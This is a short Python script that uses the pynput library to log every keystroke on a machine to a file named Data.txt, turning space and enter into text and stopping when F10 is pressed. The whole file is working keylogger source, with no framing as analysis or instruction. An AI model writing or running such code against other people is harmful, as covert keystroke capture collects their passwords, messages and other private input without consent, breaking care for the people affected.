from pynput.keyboard import Listener

def press(buttons):
    buttons = str(buttons)
    if buttons == "Key.f10":
        raise SystemExit(0)
    file = open('Data.txt', 'a', encoding='utf8')
    buttons = buttons.replace("'", "")
    if buttons == "Key.space":
        buttons = " "
    if buttons == "Key.enter":
        buttons = "\n"
    file.write(str(buttons))
    file.close()
    

run = Listener(on_press=press)
run.start()
run.join()